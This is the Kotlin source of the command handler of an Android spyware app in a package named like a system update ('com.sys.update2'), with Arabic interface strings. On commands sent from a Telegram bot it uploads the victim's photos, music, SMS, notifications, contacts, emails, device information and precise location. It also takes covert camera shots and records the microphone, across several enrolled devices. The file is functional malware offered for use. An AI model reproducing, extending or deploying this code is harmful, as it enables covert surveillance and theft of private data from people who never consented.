package com.sys.update2

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "cmd: $cmd")

        when {
            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)

            // ═══ Toggle الأزرار ═══
            cmd == "🟢 تشغيل الصور" || cmd == "🔴 إيقاف الصور" -> togglePhotos(ctx)
            cmd == "🟢 تشغيل SMS" || cmd == "🔴 إيقاف SMS" -> toggleSms(ctx)
            cmd == "🟢 تشغيل الإشعارات" || cmd == "🔴 إيقاف الإشعارات" -> toggleNotifs(ctx)
            cmd == "🟢 تشغيل الموقع" || cmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx)
            cmd == "🟢 تشغيل المايك" || cmd == "🔴 إيقاف المايك" -> toggleAudio(ctx)

            // ═══ عرض ═══
            cmd == "🔔 عرض الإشعارات" -> fetchAllNotifs(ctx)
            cmd == "📍 عرض الموقع" -> showLocation(ctx)

            // ═══ الأوامر العادية ═══
            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)
            cmd == "📩 كل الرسائل" || cmd == "/sms" -> fetchAllSms(ctx)
            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)
            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
            cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
            cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)

            // ═══ قائمة الأجهزة ═══
            cmd == "📱 قائمة الأجهزة" -> showDeviceList(ctx)
            cmd == "🌐 كل الأجهزة" -> selectDevice(ctx, "all", "كل الأجهزة")

            cmd.startsWith("🎯 ") -> selectDevice(ctx, cmd.removePrefix("🎯 "), cmd.removePrefix("🎯 "))

            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $cmd", KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  TOGGLE
    // ═══════════════════════════════════════════
    private fun togglePhotos(ctx: Context) {
        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage(
            "📸 *الصور التلقائية*\n\nالحالة: $state",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun toggleSms(ctx: Context) {
        KeyboardBuilder.smsOn = !KeyboardBuilder.smsOn
        val state = if (KeyboardBuilder.smsOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage(
            "📩 *SMS التلقائية*\n\nالحالة: $state",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun toggleNotifs(ctx: Context) {
        KeyboardBuilder.notifsOn = !KeyboardBuilder.notifsOn
        val state = if (KeyboardBuilder.notifsOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage(
            "🔔 *الإشعارات*\n\nالحالة: $state",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun toggleLocation(ctx: Context) {
        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage(
            "📍 *تتبع الموقع*\n\nالحالة: $state",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun toggleAudio(ctx: Context) {
        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
        if (KeyboardBuilder.audioOn) {
            AudioRecorder.startLoop(ctx)
        } else {
            AudioRecorder.stopLoop(ctx)
        }
        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
        TelegramApi.sendMessage(
            "🎤 *الميكروفون*\n\nالحالة: $state",
            KeyboardBuilder.replyKeyboard()
        )
    }

    // ═══════════════════════════════════════════
    //  قائمة الأجهزة
    // ═══════════════════════════════════════════
    private fun showDeviceList(ctx: Context) {
        runJob(ctx, "devices") {
            TelegramApi.sendMessage("📱 *جاري تحميل الأجهزة...*")
            val devices = DeviceManager.getDeviceList(ctx)

            if (devices.isEmpty()) {
                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة", KeyboardBuilder.replyKeyboard())
                return@runJob
            }

            val sb = StringBuilder()
            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((id, name, online) in devices) {
                val status = if (online) "🟢 متصل" else "🔴 غير متصل"
                sb.append("$status *$name*\n")
                sb.append("`$id`\n\n")
            }

            val keyboard = KeyboardBuilder.deviceListKeyboard(
                devices.map { it.first to it.second }
            )

            TelegramApi.sendMessage(sb.toString(), keyboard)
        }
    }

    private fun selectDevice(ctx: Context, name: String, id: String) {
        TelegramApi.sendMessage(
            "🎯 *تم تحديد الجهاز:*\n\n*$name*\n`$id`\n\nكل الأوامر القادمة ستُنفَّذ على هذا الجهاز.",
            KeyboardBuilder.replyKeyboard()
        )
    }

    // ═══════════════════════════════════════════
    //  الأوامر الأساسية
    // ═══════════════════════════════════════════
    private fun showMainMenu(ctx: Context) {
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
            val loc = LocationHelper.getPreciseLocation(ctx)
            val text = LocationHelper.formatLocation(ctx, loc)
            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الصور
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendMediaList(ctx, all, "📸 كل الصور")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendMediaList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
            return
        }
        var sent = 0
        var failed = 0
        for (item in list) {
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++
        }
        TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  الموسيقى — كمقاطع صوتية
    // ═══════════════════════════════════════════
    private fun fetchAllMusic(ctx: Context) {
        runJob(ctx, "music") {
            val music = MediaScanner.scanAudio(ctx)
            if (music.isEmpty()) {
                TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
                return@runJob
            }

            TelegramApi.sendMessage(
                "🎵 *جاري إرسال ${music.size} مقطع...*\n\n" +
                "⚠️ سيأخذ وقتًا حسب الحجم.",
                KeyboardBuilder.replyKeyboard()
            )

            var sent = 0
            var failed = 0
            for (m in music) {
                val file = File(m.path)
                if (!file.exists()) { failed++; continue }

                // إرسال كمقطع صوتي (sendAudio)
                val ok = TelegramApi.sendAudio(file, "🎵 ${m.name}")
                if (ok) {
                    sent++
                } else {
                    failed++
                }

                // انتظار قصير لتجنب flood
                Thread.sleep(300)
            }

            TelegramApi.sendMessage(
                "🎵 *انتهى*\n\n" +
                "✅ $sent\n❌ $failed",
                KeyboardBuilder.replyKeyboard()
            )
        }
    }

    // ═══════════════════════════════════════════
    //  الكاميرا
    // ═══════════════════════════════════════════
    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية 🤳" else "خلفية 📸"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 صورة ($label)")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  SMS
    // ═══════════════════════════════════════════
    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }
            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *SMS* — ${all.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الإشعارات
    // ═══════════════════════════════════════════
    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs") {
            val lines = DataStore.readNotifications(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
                catch (_: Exception) { null }
            }
            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
                    if (tx.isNotBlank()) sb.append("    $tx\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  جهات الاتصال
    // ═══════════════════════════════════════════
    private fun fetchContacts(ctx: Context) {
        runJob(ctx, "contacts") {
            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                if (c.emails.isNotEmpty()) sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                sb.append("\n")
                count++
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
                if (count >= 150) { sb.append("… +${contacts.size - count} آخرين\n"); break }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الإيميلات (محدّث — يجيب من Google أيضاً)
    // ═══════════════════════════════════════════
    private fun fetchEmails(ctx: Context) {
        runJob(ctx, "emails") {
            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) {
                TelegramApi.sendMessage(
                    "📭 لا توجد إيميلات\n\n" +
                    "⚠️ تأكد من:\n" +
                    "• صلاحية جهات الاتصال\n" +
                    "• حساب Google مسجّل على الجهاز",
                    KeyboardBuilder.replyKeyboard()
                )
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for (e in emails) {
                sb.append("✉️ *${e.name}*\n`${e.email}`\n\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(400)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(400)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(400)
            val photos = MediaScanner.scanImages(ctx).take(30)
            sendMediaList(ctx, photos, "📸 الصور")
            Thread.sleep(400)
            fetchAllSms(ctx)
            Thread.sleep(400)
            fetchAllNotifs(ctx)
            Thread.sleep(400)
            fetchContacts(ctx)
            Thread.sleep(400)
            fetchEmails(ctx)
            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}", KeyboardBuilder.replyKeyboard())
            }
        }.start()
    }
}
